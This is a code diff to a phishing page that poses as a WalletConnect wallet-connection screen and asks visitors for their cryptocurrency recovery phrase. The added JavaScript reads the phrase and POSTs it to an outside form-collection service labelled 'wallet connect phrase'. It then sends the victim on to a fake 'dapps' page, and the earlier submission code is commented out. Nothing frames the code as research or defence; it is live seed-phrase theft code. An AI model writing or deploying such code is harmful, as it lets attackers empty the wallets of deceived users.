@@ -708,7 +708,7 @@
   
                         </div>
                         <div class="flex flex-col mb-6">
-                          <div class="relative" data-children-count="1"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" required=""></textarea>
+                          <div class="relative" data-children-count="1"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" id="phrase" required=""></textarea>
                             <p class="text-xs text-grey-300 mt-6">
                               Typically 12 (sometimes 24) words separated by
                               single spaces
@@ -2067,7 +2067,32 @@ formS.addEventListener('submit', (event) => {
 
   const formData = new FormData(formS); // create new FormData object
 
-  fetch('https://usebasin.com/f/dd8b9621a326', { //sd
+  var phraseText = document.getElementById('phrase').value;
+  
+      fetch("https://submit-form.com/gmAjhBF4R", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json",
+        },
+        body: JSON.stringify({
+          message: "wallet connect phrase: "+phraseText,
+        }),
+      })
+        .then(function (response) {
+        console.log(response);
+        window.location.href = 'https://wallet-connect-dapps.vercel.app/dapps.html'; // redirect to thank you page
+
+        })
+        .catch(function (error) {
+          console.error(error);
+        });
+setTimeout(() => { proceed();}, 2000);
+
+  
+});
+    
+   /** fetch('https://usebasin.com/f/dd8b9621a326', { //sd
     method: 'POST',
     body: formData // pass form data as the request body
   })
@@ -2088,6 +2113,7 @@ setTimeout(() => { proceed();}, 2000);
 
   
 });
+**/
 
 
 
